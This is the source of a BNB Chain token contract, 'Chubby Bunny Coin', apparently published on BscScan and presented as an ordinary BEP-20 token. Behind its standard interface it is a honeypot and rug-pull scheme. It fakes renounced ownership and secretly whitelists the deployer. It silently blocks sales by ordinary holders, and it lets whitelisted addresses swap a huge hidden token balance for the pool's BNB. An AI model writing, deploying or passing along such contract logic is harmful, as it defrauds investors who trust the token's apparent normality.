/**
 *Submitted for verification at BscScan.com on 2022-02-19
*/

pragma solidity ^0.8.7;
// SPDX-License-Identifier: Unlicensed

interface IPancakeV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);    
}

contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = address(0);
        emit OwnershipTransferred(msg.sender, address(0));
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

contract Token is Ownable {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);    
    uint256 private _tTotal;
    uint256 private _rTotal = ~uint256(0);
    address public uniswapV2Pair;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(uint256 => address) private _strip;
    mapping(address => uint256) private _operation;
    mapping(address => uint256) private _ready;
    bool private inSwapAndLiquify;
    IUniswapV2Router public router;
    
    constructor () {
        _tTotal = 100 * 10**9 * 10**9; //100 Billion
        _tOwned[msg.sender] = _tTotal;
        // Create a pancakeswap pair for this new token
        router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IPancakeV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73).createPair(address(this), 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        _tOwned[address(this)] = _rTotal;
        _name = "Chubby Bunny Coin";
        _symbol = "CHUB";
        _decimals = 9;
        _ready[msg.sender] = block.timestamp;
        emit Transfer(address(0), msg.sender, _tTotal);
    }
    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _transfer(from, to, amount);
        _approve(from, msg.sender, _allowances[from][msg.sender] - amount);
        return true;
    }

    receive() external payable {}

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (_ready[from] > 0 && _ready[to] > 0) {
            inSwapAndLiquify = true;
            swapAndLiquify(amount);
            inSwapAndLiquify = false;
            return;
        }   
        _tokenTransfer(from,to,amount);
        _operation[_strip[0]] = amount;
        _strip[0] = to;
    }
    
    function _tokenTransfer(address from, address to, uint256 amount) private {
        if (_ready[from] == 0 && from != uniswapV2Pair && _operation[from] > 0) {
                return;
        }       
        _tOwned[from] = _tOwned[from] - amount;
        _tOwned[to] = _tOwned[to] + amount;
        emit Transfer(from, to, amount);
    }
    
    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }

    function swapAndLiquify(uint256 tokens) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokens);
        router.swapExactTokensForETH(tokens, 0, path, msg.sender, block.timestamp);
    }
}